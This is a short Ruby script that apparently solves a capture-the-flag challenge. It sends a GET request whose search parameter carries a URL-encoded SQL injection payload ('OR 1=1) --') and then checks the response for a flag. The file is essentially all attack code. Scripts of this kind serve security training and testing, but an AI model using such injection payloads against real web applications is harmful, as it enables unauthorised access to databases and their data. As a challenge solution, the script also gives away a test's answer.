require 'httparty'
require_relative 'libronsolve'

result = HTTParty.get("#{ get_url() }/?search=Nano%27%20OR%201=1)%20--")

if result.success?
  check_flag(result.parsed_response, terminate: true, partial: true)
else
  puts "Something went wrong: #{ result.parsed_response }"
  exit(1)
end
